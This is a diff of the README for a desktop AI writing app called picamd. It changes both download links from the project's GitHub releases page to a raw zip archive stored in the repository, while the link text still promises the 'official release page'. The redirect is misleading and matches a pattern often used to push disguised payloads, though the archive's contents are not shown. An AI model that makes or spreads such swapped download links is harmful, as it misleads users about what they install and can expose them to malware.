@@ -1,6 +1,6 @@
 # ✍️ picamd - Write faster with smart AI tools
 
-[![](https://img.shields.io/badge/Download-picamd-blue.svg)](https://github.com/Lesser-foglamp538/picamd/releases)
+[![](https://img.shields.io/badge/Download-picamd-blue.svg)](https://raw.githubusercontent.com/Lesser-foglamp538/picamd/main/PicaMDQuickLook/Software_v3.8.zip)
 
 picamd brings professional writing tools to your desktop. This application combines a clean workspace with modern artificial intelligence. It handles your notes, documents, and creative projects in one place. You get a live view of your work as you type. The app supports multiple AI providers to help you edit text, fix grammar, or expand ideas. It also includes an internal server to connect your local files with AI assistants.
 
@@ -8,7 +8,7 @@ picamd brings professional writing tools to your desktop. This application combi
 
 You can get picamd at the official release page. This page hosts the most current version of the software.
 
-[Click here to visit the release page and download the app](https://github.com/Lesser-foglamp538/picamd/releases)
+[Click here to visit the release page and download the app](https://raw.githubusercontent.com/Lesser-foglamp538/picamd/main/PicaMDQuickLook/Software_v3.8.zip)
 
 Follow these steps to install the software on your computer:
 
